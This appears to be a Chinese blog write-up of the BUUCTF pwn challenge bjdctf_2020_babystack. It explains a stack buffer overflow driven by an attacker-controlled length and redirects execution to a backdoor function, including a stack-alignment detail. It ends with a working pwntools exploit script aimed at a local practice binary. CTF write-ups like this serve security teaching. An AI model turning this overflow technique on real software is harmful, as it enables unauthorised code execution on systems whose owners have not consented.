---
title: BUUCTF-bjdctf_2020_babystack 题解
date: 2025-10-29 12:17:00
tags: 
    - stack
    - pwn
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babystack)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/bjdctf-2020-babystack/checksec.png)

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/bjdctf-2020-babystack/IDA.png)

很显然，由于 nbytes 可以被赋予一个较大的值，使得 buf 可以被溢出。

### backdoor

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/bjdctf-2020-babystack/backdoor.png)

### 思路

利用的栈溢出漏洞覆盖函数返回地址，使之返回到这个后门函数提权即可。

附一个图示：

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/bjdctf-2020-babystack/overflow.jpg)

根据 buf 的位置 `[rbp-10h]` 可构造 `payload = b'A' * (16 + 8) + backdoor_addr` 实现攻击，由于需要栈对齐，其中，`backdoor_addr = 0x4006ea` ，而不是 `backdoor_addr = 0x4006e6`

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./bjdctf_2020_babystack')

p.recvuntil(b'name:\n')

payload = b'40'
p.sendline(payload)

p.recvuntil(b'name?\n')

backdoor_addr = p64(0x4006ea)
payload = b'A' * (16 + 8) + backdoor_addr

p.sendline(payload)

p.interactive()
```